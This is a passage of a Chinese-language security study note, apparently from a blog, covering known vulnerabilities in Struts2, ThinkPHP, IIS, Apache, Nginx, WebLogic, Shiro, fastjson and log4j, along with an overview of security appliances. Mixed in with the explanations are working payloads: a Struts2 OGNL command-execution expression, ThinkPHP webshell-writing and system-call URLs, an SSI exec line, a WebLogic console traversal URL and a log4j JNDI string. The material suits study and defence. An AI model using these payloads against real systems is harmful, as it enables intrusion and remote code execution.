<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),#f.getWriter().close()</span><br></pre></td></tr></table></figure>



<h2 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h2><h4 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h4><p>漏洞存在于 ThinkPHP 模板引擎中，在加载模版解析变量时存在变量覆盖问题，而且程序没有对数据进行很好的过滤，最终导致文件包含漏洞的产生。</p>
<p>漏洞利用：</p>
<p>创建 application&#x2F;index&#x2F;view&#x2F;index&#x2F;index.html 文件，并将图片马 1.jpg 上传至 public 目录下，访问 <a target="_blank" rel="noopener" href="http://localhost:8000/index/index/index?cacheFile=demo.php">http://localhost:8000/index/index/index?cacheFile=demo.php</a> 链接，即可触发文件包含漏洞 。</p>
<p>官方修复：先将 $cacheFile 变量存储在 $this-&gt;cacheFile 中，在使用 extract 函数后，最终 include 的变量是 $this-&gt;cacheFile ，这样也就避免了 include 被覆盖后的变量值。</p>
<h4 id="通过缓存的rce"><a href="#通过缓存的rce" class="headerlink" title="通过缓存的rce"></a>通过缓存的rce</h4><p>漏洞存在于 thinkphp&#x2F;library&#x2F;think&#x2F;Cache.php 的 Cache 类中，该类会将缓存数据通过序列化的方式，直接存储在 .php 文件中，攻击者通过精心构造的 payload ，即可将 webshell 写入缓存文件。缓存文件的名字和目录均可预测出来，一旦缓存目录可访问或结合任意文件包含漏洞，即可触发远程代码执行漏洞。</p>
<p>漏洞影响版本： 5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.10 </p>
<p>攻击链：</p>
<p>payload &#x3D;&gt; Cache::set() &#x3D;&gt; Cache::init() &#x3D;&gt; thinkphp\library\think\driver\File::set() &#x3D;&gt; serialize()：在文件开头拼接了“&#x2F;&#x2F;”注释符（换行绕过即可），存储为 php 文件</p>
<p>文件名生成规则：获得键名的 md5 值，然后将该 md5 值的前 2 个字符作为缓存子目录，后 30 字符作为缓存文件名，如果应用程序还设置了前缀 $this-&gt;options[‘prefix’] ，则缓存文件还将多一个上级目录。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/tpdemo/public/?username=username123%0d%0a@eval($_GET[_]);  </span><br><span class="line">// 将 webshell 写入缓存文件。</span><br></pre></td></tr></table></figure>

<h4 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h4><p>漏洞影响版本： 5.0.7&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.22 、5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30。</p>
<p>漏洞成因：</p>
<p> ThinkPHP 底层没有对控制器名进行很好的合法性校验，在没有开启强制路由情况下，可以使用路由兼容模式 s 参数，用户可以通过此参数调用任意类的任意方法，最终导致远程代码执行漏洞的产生。</p>
<p>vulnerable url：</p>
<p> <a target="_blank" rel="noopener" href="http://localhost:8000/?s=index/%5Cthink%5CRequest/input&filter%5B%5D=system&data=pwd">http://localhost:8000/?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd</a><br>两种漏洞利用：</p>
<p>1）所有用户参数都会经过 Request 类的 input 方法处理，该方法会调用 filterValue 方法，而 filterValue 方法中使用了 call_user_func()</p>
<p>攻击链：payload &#x3D;&gt; Request::input() &#x3D;&gt; filterValue() &#x3D;&gt; call_user_func() &#x3D;&gt; rce</p>
<p>2）控制器名称从兼容模式下的s参数获取，但对s的值没有做任何安全处理，最后会被传递到exec()，造成rce</p>
<p>攻击链：payload &#x3D;&gt; s &#x3D;&gt; Dispatch::$result &#x3D;&gt; App::run() &#x3D;&gt; Dispatch::run &#x3D;&gt; exec() &#x3D;&gt; rce</p>
<h4 id="基于debug的rce"><a href="#基于debug的rce" class="headerlink" title="基于debug的rce"></a>基于debug的rce</h4><p>漏洞影响版本： 5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.23 、5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30。</p>
<p>漏洞成因:</p>
<p> ThinkPHP 底层没有对控制器名进行很好的合法性校验，在没有开启强制路由情况下，可以使用路由兼容模式 s 参数，用户可以通过此参数调用任意类的任意方法，最终导致远程代码执行漏洞的产生。同时，用户可以通 $_POST 数组传递请求方法 $method 的值，而且在获取之后没有进行任何检查，thinkphp直接把它作为 Request 类的方法进行调用，相当于可以随意调用 Request 类的部分方法。同时，Request 类的 __construct 方法中存在类属性覆盖的功能。</p>
<p>1）当框架在配置文件中开启了 debug 模式（ ‘app_debug’&#x3D;&gt; true ）</p>
<p>程序会调用 Request 类的 param 方法，因此可以覆盖原来的方法，转而调用Request::input()，进而调用call_user_func()函数。</p>
<p>2）为开启 debug 模式</p>
<p>在 Dispatch 类的 run 方法中，会执行一个 exec 方法，当该方法中的 $dispatch[‘type’] 等于 controller 或者 method 时，又会调用 Request 类的 param 方法。$dispatch[‘type’] 来源于 parseRule 方法中的 $result 变量，而 $result 变量又与 $route 变量有关系， $route 变量取决于程序中定义的路由地址方式，GET方式中存在一条路由，可以利用这一路由地址，使得 $dispatch[‘type’] 等于 method ，从而完成 远程代码执行漏洞。</p>
<p>路由方式：’\完整的命名空间类@动态方法’</p>
<p>\think\Route::get(‘captcha&#x2F;[:id]’, “\think\captcha\CaptchaController@index”)</p>
<h1 id="常见的服务器容器"><a href="#常见的服务器容器" class="headerlink" title="常见的服务器容器"></a>常见的服务器容器</h1><h2 id="（一）-IIS"><a href="#（一）-IIS" class="headerlink" title="（一） IIS"></a><strong>（一） IIS</strong></h2><p><strong>1、PUT漏洞</strong></p>
<p>IIS在网站拓展服务中开启了WebDAV，配合写入权限，存在PUT任意文件写入漏洞</p>
<p><strong>2、短文件名猜解</strong></p>
<p>IIS 的短文件名机制,可以暴力猜解短文件名,访问构造的某个存在的短文件名,会返回404,访问构造的某个不存在的短文件名,返回400。</p>
<p>然后根据猜解的短文件名。继续通过其他方法猜文件名全名。</p>
<p>总结</p>
<p>该漏洞的意义:</p>
<p>1、 猜解后台地址</p>
<p>2、 猜解敏感文件,例如备份的rar、zip、.bak、.sql文件等。</p>
<p>3、 在某些情形下,甚至可以通过短文件名web直接下载对应的文件。</p>
<p>该漏洞的局限性:</p>
<p>1、 只能猜解前六位,以及扩展名的前三位。</p>
<p>2、 名称较短的文件是没有相应的短文件名的。</p>
<p>3、 不支持中文文件名</p>
<p>4、 如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配</p>
<p>5、 需要IIS和.net两个条件都满足。</p>
<p><strong>3、远程代码执行</strong></p>
<p><img src="/photo/image-20240626175848648.png" alt="image-20240626175848648"></p>
<p><strong>4、解析漏洞</strong></p>
<p>6.x</p>
<p>1） 该版本默认会将*.asp;.jpg 此种格式的文件名，当成Asp解析，原理是服务器默认不解析;号及其后面的内容，相当于截断。</p>
<p>（2）该版本默认会将*.asp&#x2F;目录下的所有文件当成Asp解析。</p>
<p>修复：微软认为这不是一个漏洞，所以要自己修复。</p>
<p>限制上传目录执行权限，不允许执行脚本。<br>不允许新建目录。<br>上传的文件经过重命名<br>（3）llS6.x除了会将扩展名为.asp的文件解析为asp之外，还默认会将扩展名为.asa，.cdx，.cer解析为asp,</p>
<p>7.x</p>
<p> IIS 7.x 解析漏洞<br>（1）在一个文件路径(&#x2F;xx.jpg)后面加上&#x2F;xx.php会将&#x2F;xx.jpg&#x2F;xx.php 解析为 php 文件。</p>
<p>上传phpinfo的文件，命名为test.png，正常情况下不解析。但在后面加 &#x2F;.php ，就可以以php格式运行。</p>
<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-QTnxxUxU-1660731137896)(C:\Users\25764\AppData\Roaming\Typora\typora-user-images\image-20220817095919146.png)]</p>
<p>但有的时候会显示404，原因是先提条件需关闭phpStudy_FastCGI中的请求限制。</p>
<h2 id="（二）-Apache"><a href="#（二）-Apache" class="headerlink" title="（二） Apache"></a><strong>（二） Apache</strong></h2><h3 id="apache漏洞分析"><a href="#apache漏洞分析" class="headerlink" title="apache漏洞分析"></a>apache漏洞分析</h3><h3 id="1-2-Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#1-2-Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="1.2.Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>1.2.Apache <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=HTTPD&spm=1001.2101.3001.7020">HTTPD</a> 换行解析漏洞（CVE-2017-15715）</h3><h4 id="1-2-1-漏洞介绍"><a href="#1-2-1-漏洞介绍" class="headerlink" title="1.2.1.漏洞介绍"></a>1.2.1.漏洞介绍</h4><p>  Apache HTTPD是一款<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8&spm=1001.2101.3001.7020">HTTP服务器</a>，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<h3 id="1-3-Apache多后缀解析漏洞（apache-parsing-vulnerability）"><a href="#1-3-Apache多后缀解析漏洞（apache-parsing-vulnerability）" class="headerlink" title="1.3.Apache多后缀解析漏洞（apache_parsing_vulnerability）"></a>1.3.Apache多后缀解析漏洞（apache_parsing_vulnerability）</h3><p>1.3.1.漏洞介绍<br>  apache httpd支持一个文件多个后缀，windows对于多后缀的识别是看最后一个“.”之后的后缀名。apache对于多后缀文件的识别是从后往前识别，最后一个后缀不能被识别时，会往前识别。</p>
<h3 id="1-4-Apache-HTTP-路径穿越漏洞（CVE-2021-41773）"><a href="#1-4-Apache-HTTP-路径穿越漏洞（CVE-2021-41773）" class="headerlink" title="1.4.Apache HTTP 路径穿越漏洞（CVE-2021-41773）"></a>1.4.Apache HTTP 路径穿越漏洞（CVE-2021-41773）</h3><p>1.4.1.漏洞介绍<br>  在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：<br>  版本等于2.4.49<br>  穿越的目录允许被访问（默认情况下是不允许的）<br>  攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
<h3 id="1-5-Apache-HTTP-路径穿越漏洞（CVE-2021-42013）"><a href="#1-5-Apache-HTTP-路径穿越漏洞（CVE-2021-42013）" class="headerlink" title="1.5.Apache HTTP 路径穿越漏洞（CVE-2021-42013）"></a>1.5.Apache HTTP 路径穿越漏洞（CVE-2021-42013）</h3><p>1.5.1.漏洞介绍<br>  Apache官方在2.4.50版本中对2.4.49版本中出现的目录穿越漏洞CVE-2021-41773进行了修复，但这个修复是不完整的，CVE-2021-42013是对补丁的绕过。<br>  攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。<br>  这个漏洞可以影响Apache HTTP Server 2.4.49以及2.4.50两个版本。</p>
<h3 id="1-6-Apache-SSI-远程命令执行漏洞"><a href="#1-6-Apache-SSI-远程命令执行漏洞" class="headerlink" title="1.6.Apache SSI 远程命令执行漏洞"></a>1.6.Apache SSI 远程命令执行漏洞</h3><p>1.6.1.漏洞介绍<br>  在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<!--#exec cmd="id" -->语法执行任意命令。</p>
<h2 id="（三）-Nginx"><a href="#（三）-Nginx" class="headerlink" title="（三） Nginx"></a><strong>（三） Nginx</strong></h2><h3 id="1、文件解析"><a href="#1、文件解析" class="headerlink" title="1、文件解析"></a>1、文件解析</h3><p>Nginx的解析漏洞的出现和Nginx的版本没有关系，漏洞的产生是由于php配置问题导致的。出现了如下</p>
<p>php.ini 目录修复，如果没找到则向上一级文件查找修复，为路径修复！<br>cgi.fix_pathinfo&#x3D;1</p>
<p>php-fpm.conf 开启.php后缀和.jpg后缀解析功能，或者有一个可能，他压根为off或者空，压根没写也可以解析。<br>security.limit_extensions &#x3D; .php .jpg</p>
<p>路径修复****以及PHP-fpm开启了图片jpg或者gif或者压根没开什么文件都能解析的，愚蠢</p>
<h3 id="2、目录遍历"><a href="#2、目录遍历" class="headerlink" title="2、目录遍历"></a>2、目录遍历</h3><p>这个常见于Nginx做反向代理的情况，动态的部分被proxy_pass传递给后端端口，而静态文件需要Nginx来处理。</p>
<p>假设静态文件存储在&#x2F;home&#x2F;目录下，而该目录在url中名字为files，那么就需要用alias设置目录的别名：</p>
<p>location &#x2F;files {<br>alias &#x2F;home&#x2F;;<br>}<br>此时，访问<a target="_blank" rel="noopener" href="http://example.com/files/readme.txt%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96/home/readme.txt%E6%96%87%E4%BB%B6%E3%80%82">http://example.com/files/readme.txt，就可以获取/home/readme.txt文件。</a></p>
<p>但我们注意到，url上&#x2F;files没有加后缀&#x2F;，而alias设置的&#x2F;home&#x2F;是有后缀&#x2F;的，这个&#x2F;就导致我们可以从&#x2F;home&#x2F;目录穿越到他的上层目录：</p>
<h3 id="3、CRLF注入"><a href="#3、CRLF注入" class="headerlink" title="3、CRLF注入"></a>3、CRLF注入</h3><p> CRLF是CR和LF两个字符的拼接，它们分别代表”回车+换行”（\r\n）。十六进制编码分别为0x0d和0x0a，URL编码为%0D和%0A。CR和LF组合在一起即CRLF命令，它表示键盘上的”Enter”键，许多应用程序和网络协议使用这些命令作为分隔符。</p>
<p>CR：回车，移动到当前行的开始<br>LF：换行 ，光标垂直移动到下一行<br>         了解这个漏洞之前我们需先了解HTTP报文结构</p>
<p>HTTP报文结构与漏洞原理<br>        在http协议中，http header之间用一个CRLF字符序列分割开来，Head与Body之间用两个CRLF分割开，浏览器根据这两个CRLF来取出HTTP内容并显示出来。</p>
<p>下面两种情景十分常见：</p>
<p>用户访问<a target="_blank" rel="noopener" href="http://example.com/aabbcc%EF%BC%8C%E8%87%AA%E5%8A%A8%E8%B7%B3%E8%BD%AC%E5%88%B0https://example.com/aabbcc">http://example.com/aabbcc，自动跳转到https://example.com/aabbcc</a><br>用户访问<a target="_blank" rel="noopener" href="http://example.com/aabbcc%EF%BC%8C%E8%87%AA%E5%8A%A8%E8%B7%B3%E8%BD%AC%E5%88%B0http://www.example.com/aabbcc">http://example.com/aabbcc，自动跳转到http://www.example.com/aabbcc</a><br>第二个场景主要是为了统一用户访问的域名，更加有益于SEO优化。</p>
<p>在跳转的过程中，我们需要保证用户访问的页面不变，所以需要从Nginx获取用户请求的文件路径。查看Nginx文档，可以发现有三个表示uri的变量：</p>
<p>$uri<br>$document_uri<br>$request_uri<br>location &#x2F; {<br>return 302 <a target="_blank" rel="noopener" href="https://h/">https://h</a> o s t hosthosturi;<br>}<br>#因为$uri是解码以后的请求路径，所以可能就会包含换行符，也就造成了一个CRLF注入漏洞。</p>
<p>解释一下，1和2表示的是解码以后的请求路径，不带参数；3表示的是完整的URI（没有解码）。那么，如果运维配置了下列的代码：</p>
<p>location &#x2F; {<br>return 302 <a target="_blank" rel="noopener" href="https://h/">https://h</a> o s t hosthosturi;<br>}<br>#因为$uri是解码以后的请求路径，所以可能就会包含换行符，也就造成了一个CRLF注入漏洞。</p>
<p>因为**$uri<strong>和</strong>$document_uri**是解码以后的请求路径，所以可能就会包含换行符，也就造成了一个CRLF注入漏洞。</p>
<p>4、目录穿越</p>
<h2 id="（四）Tomcat"><a href="#（四）Tomcat" class="headerlink" title="（四）Tomcat"></a><strong>（四）Tomcat</strong></h2><p><img src="/photo/image-20240626183058312.png" alt="image-20240626183058312"></p>
<p>1、远程代码执行</p>
<p>2、war后门文件部署</p>
<h2 id="（五）jBoss"><a href="#（五）jBoss" class="headerlink" title="（五）jBoss"></a><strong>（五）jBoss</strong></h2><p><img src="/photo/image-20240626183234691.png" alt="image-20240626183234691"></p>
<p>1、反序列化漏洞</p>
<p>漏洞编号为CVE-2017-12149，这个漏洞利用了 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，如果包含恶意数据则会导致该漏洞。</p>
<p>2、war 后门文件部署</p>
<p>基本是通过未授权访问然后上传war包</p>
<h2 id="（六）WebLogic"><a href="#（六）WebLogic" class="headerlink" title="（六）WebLogic"></a><strong>（六）WebLogic</strong></h2><p>1、反序列化漏洞</p>
<p>Weblogic T3协议反序列化(CVE-2018-2628)漏洞<br>0x00 漏洞描述<br>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击。WebLogic XMLDecoder反序列化漏洞（CVE-2017-3506）</p>
<p>0x00 漏洞描述</p>
<p>网上爆出weblogic的WLS组件存在xmldecoder反序列化漏洞，直接post构造的xml数据包即可rce。</p>
<p>2、SSRF</p>
<p>Weblogic 的 uddi 组件实现包中有个 ddiexplorer.war文件，其下里 SearchPublicReqistries.jsp 接口存在 SSRF 漏洞，可以利用该漏洞可以发送任意 HTTP 请求，实现攻击内网中 Redis 等脆弱组件。</p>
<p>直接访问漏洞url<br><a target="_blank" rel="noopener" href="http://192.168.190.136:7001/uddiexplorer/SearchPublicRegistries.jsp">http://192.168.190.136:7001/uddiexplorer/SearchPublicRegistries.jsp</a></p>
<p><img src="/photo/image-20240628111551751.png" alt="image-20240628111551751"></p>
<p>通过脚本探测端口后</p>
<p><img src="/photo/image-20240628111718089.png" alt="image-20240628111718089"></p>
<p>反弹shell</p>
<p>3、任意文件上传</p>
<p>4、war后门文件部署</p>
<p>5、未授权访问</p>
<p>Weblogic未授权访问-CVE-2020-14882 &amp;&amp; 命令执行-CVE-2020-14883<br>0x00 漏洞描述<br>远程代码执行漏洞 （CVE-2020-14882）POC 已被公开，未经身份验证的远程攻击者可通过构造特殊的 HTTP GET 请求，结合 CVE-2020-14883 漏洞进行利用，利用此漏洞可在未经身份验证的情况下直接接管 WebLogic Server Console ，并执行任意代码，利用门槛低，危害巨大。<br>直接访问 <a target="_blank" rel="noopener" href="http://192.168.190.1:7001/console/images/%252E%252E%252Fconsole.portal">http://192.168.190.1:7001/console/images/%252E%252E%252Fconsole.portal</a><br>未授权访问后台</p>
<p>通过问未授权访问到管理后台页面，利用第二个命令执行漏洞（cve-2020-14883）<br>这个漏洞的利用方式有两种<br>一是通过 com.tangosol.coherence.mvel2.sh.ShellSession()<br>二是通过com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext()<br>—windows环境—</p>
<p><strong>（七）其它中间件相关漏洞</strong> 1、FastCGI未授权访问、任意命令执行</p>
<p>2、PHPCGI远程代码执行</p>
<h1 id="常见的配置文件路径"><a href="#常见的配置文件路径" class="headerlink" title="常见的配置文件路径"></a>常见的配置文件路径</h1><ul>
<li><p>apache：<code>/etc/httpd/conf</code></p>
</li>
<li><p>nginx：<code>/etc/nginx</code></p>
</li>
<li><p>iis7：<code>C:\Windows\System32\inetsrv\config\</code></p>
</li>
<li><p>Windows 主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志</p>
</li>
</ul>
<p>系统日志：<code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p>
<p>应用程序日志：<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p>
<p>安全日志：<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></p>
<ul>
<li>Linux</li>
<li>日志默认存放位置：<code>/var/log/</code> 查看日志配置情况：more &#x2F;etc&#x2F;rsyslog.conf</li>
</ul>
<h1 id="反序列化-1"><a href="#反序列化-1" class="headerlink" title="反序列化"></a>反序列化</h1><p>依靠本地序列化来构建有危害的序列化值</p>
<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化:"></a>PHP反序列化:</h2><p>将PHP中 对象、类、数组、变量、匿名函数等，转化为字符串，方便保存到数据库或者文件中<br>反序列化就是再将这个状态信息拿出来使用<br>当传给 unserialize() 的参数可控时，那么用户就可以注入精心构造的payload。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。<br>反序列化用到的函数:</p>
<p>序列化:serialize,json_encode</p>
<p>反序列化:unserialize,json_decode</p>
<h2 id="Java序列化"><a href="#Java序列化" class="headerlink" title="Java序列化"></a>Java序列化</h2><p>JAVA序列化是指把Java对象转化为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的writeObject()方法可以实现序列化。JAVA反序列化是指把字节序列恢复为Java对象的过程，ObjectInputStream类的readObject()方法用于反序列化。</p>
<h2 id="Shiro反序列化原理"><a href="#Shiro反序列化原理" class="headerlink" title="Shiro反序列化原理:"></a>Shiro反序列化原理:</h2><p> Apache Shiro 是一个强大易用的Java安全框架,提供了认证、授权、加密和会话管理等功能， </p>
<p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：</p>
<ol>
<li>检索RememberMe Cookie的值</li>
<li>Base 64解码</li>
<li>AES解密（加密密钥硬编码）</li>
<li>进行反序列化操作（未过滤处理）</li>
</ol>
<p>攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令</p>
<p>特征:进行登录，返回包中查看是否有rememberMe&#x3D;deleteMe字段</p>
<p>只要rememberMe的AES加密密钥泄漏，无论shiro什么版本都会导致反序列化漏洞。</p>
<p>Shiro550有默认秘钥，shiro721无默认密钥可通过Padding Oracle Attack（Oracle填充攻击）利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击.</p>
<p><img src="/photo/image-20240609175646852.png" alt="image-20240609175646852"></p>
<p>判断成功与否的方法：</p>
<p><img src="/photo/image-20240609225713527.png" alt="image-20240609225713527"></p>
<p><img src="/photo/image-20240609225724365.png" alt="image-20240609225724365"></p>
<p><strong>未知Http方法名绕WAF这个姿势</strong></p>
<h2 id="Weblogic反序列化"><a href="#Weblogic反序列化" class="headerlink" title="Weblogic反序列化"></a>Weblogic反序列化</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/175738#h2-4">https://www.anquanke.com/post/id/175738#h2-4</a></p>
<p>有两种，一个是基于T3协议的反序列化漏洞，一个是基于XML的反序列化漏洞</p>
<p>基于xml：这里xml本身就是序列化对象，通过XMLDecoder进行反序列化解析(循环遍历XML数据并进行拼接处理)，最终拼接出完整的恶意语句并执行</p>
<p>特征:7001端口</p>
<p>基于T3协议的反序列化，其实Ysoserial 生成的序列化文件也是基于T3构造的，通过直接传序列化好的payload，触发readobject()执行</p>
<p>基于xml解析时候造成的反序列化</p>
<p>​		WebLogic Server 10.3.6.0.0版本</p>
<p>​		WebLogic Server 12.1.3.0.0版本</p>
<p>​		WebLogic Server 12.2.1.1.0版本</p>
<p>​		WebLogic Server 12.2.1.2.0版本</p>
<p>weblogic是一个基于JavaEE的中间件，所以可以解析jsp代码，那么，当我们知道后台密码之后，即可登陆weblogic后台，上传恶意war包，从而进行提权等操作</p>
<h2 id="Struts2-反序列化原理"><a href="#Struts2-反序列化原理" class="headerlink" title="Struts2 反序列化原理:"></a>Struts2 反序列化原理:</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击</p>
<p>原理是向Struts Action Post 注入数据</p>
<p>特征:文件名为:.do,.action,Struts</p>
<h2 id="fastjson反序列化"><a href="#fastjson反序列化" class="headerlink" title="fastjson反序列化"></a>fastjson反序列化</h2><p>@type 指定类<br>使用<code>JSON.parse</code>方法反序列化会调用此类的set方法<br>使用<code>JSON.parseObject</code>方法反序列化会调用此类get和set方法<br>可以写一个恶意类，然后通过这一特性实现命令执行</p>
<p>在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是bytecodes，有部分函数会根据这个bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数。</p>
<h2 id="apache-log4j"><a href="#apache-log4j" class="headerlink" title="apache log4j"></a>apache log4j</h2><p><img src="/photo/image-20240626194742323.png" alt="image-20240626194742323"></p>
<p><img src="/photo/image-20240626195414069.png" alt="image-20240626195414069"></p>
<p>log4j 是 javaweb 的日志组件，用来记录 web 日志，该漏洞主要是由于日志在打印时当遇到${后，以:号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞特征：${jndi：rmi</p>
<p>去指定下载文件的 url 在搜索框或者搜索的 url 里面，加上 ${jndi:ldap:&#x2F;&#x2F;127.0.0.1&#x2F;test} ，log4j 会对这串代码进行表达式解析，给 lookup 传递一个恶意的参数指定，参数指的是比如 ldap 不存在的资源 $ 是会被直接执行的。后面再去指定下载文件的 url，去下载我们的恶意文件。比如是 x.class 下载完成后，并且会执行代码块</p>
<p>修复：升级 Log4j 到最新版本，根据业务判断是否关闭 lookup</p>
<p>Apache Log4j2中存在JNDI注入漏洞，主要原理是利用log4j2的日志输出jndi远程对象时,调用远程对象没做检查导致，程序将用户输入的数据进行日志记录时即可触发该漏洞并可在目标服务器上执行任意代码。该漏洞利用过程需要找到一个能触发远程加载并应用配置的输入点，迫使服 务器远程加载和修改配置的前提下使目标系统通过JNDI远程获取数据库源，触发攻击者的恶意代码。</p>
<h1 id="安全设备"><a href="#安全设备" class="headerlink" title="安全设备"></a>安全设备</h1><p>绿盟:waf，ips入侵防御系统，ids 入侵检测系统</p>
<p>安恒:APT<br>奇安信:天眼，态势感知，探针</p>
<p>360:安全大脑，360威胁情报</p>
<p>蜜罐</p>
<p>常见的 HW 设备有：公安部网防G01、K01、360网康&#x2F;网神防火墙、微步威胁情报、安恒云-Web应用防火墙（玄武盾）、默安蜜罐、知道创宇蜜罐、山石防火墙</p>
<p><img src="/photo/v2-d8befd2444d169cfea9de6706506abfe_720w.webp" alt="img"></p>
<p>即客户拥有物理的基础设施（自建机房、自购设备、网络）</p>
<ul>
<li>NGAF&#x2F;NGFW：下一代 Web 应用防火墙（Next Generation Application Firewall，通防火墙和下一代防火墙的区别），聚合了以下功能</li>
<li>IDS</li>
</ul>
<p>HIDS：基于主机的入侵检测系统</p>
<p>NIDS：基于网络的入侵检测系统</p>
<p>HIDS+NIDS：基于混合数据源的入侵检测系统</p>
<ul>
<li>IPS：入侵防御系统</li>
<li>AV：反病毒系统</li>
<li>EDR：主机安全管理\终端检测和响应</li>
</ul>
<p>EDR 实时监测终端上发生的各类行为，采集终端运行状态，在后端通过大数据安全分析、机器学习、沙箱分析、行为分析、机器学习等技术，提供深度持续监控、威胁检测、高级威胁分析、调查取证、事件响应处置、追踪溯源等功能，可第一时间检测并发现恶意活动，包括已知和未知威胁，并快速智能地做出响应，全面赋予终端主动、积极的安全防御能力</p>
<p>简单来说就是给内网环境中所有主机安装管理软件终端，可以在管理平台集中管理和数据分析过滤，基本所有安全厂商都有自己的 EDR 产品</p>
<ul>
<li>运维审计和管理平台（堡垒机</li>
<li>DAS：数据库安全审计平台</li>
<li>LAS：日志审计安全平台</li>
<li>AC：上网行为管理系统</li>
<li>伪装欺骗系统（蜜罐、蜜网）</li>
<li>SIP：安全态势感知平台</li>
</ul>
<p>这个算是让整套系统性能得到提升的灵魂了，定位为客户的安全大脑，是一个集检测、可视、响应处置于一体的大数据安全分析平台。产品以大数据分析为核心，支持主流的安全设备、网络设备、操作系统等多源数据接入，利用大数据、关联分析、告警降噪等技术，实现海量数据的统一挖掘分析</p>
<p><strong>云网络</strong></p>
<ul>
<li>云网络包括私有云和公有云</li>
<li>云主机安全</li>
<li>云防火墙</li>
<li>云堡垒机</li>
<li>云蜜罐</li>
<li>云 DDOS 防护</li>
<li>等等</li>
</ul>
<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><ul>
<li>Web基础防护</li>
</ul>
<p>可防范常规的 web 应用攻击，如 SQL 注入攻击、XSS 跨站攻击等，可检测 webshell，检查 HTTP 上传通道中的网页木马，打开开关即实时生效</p>
<ul>
<li>CC 攻击防护</li>
</ul>
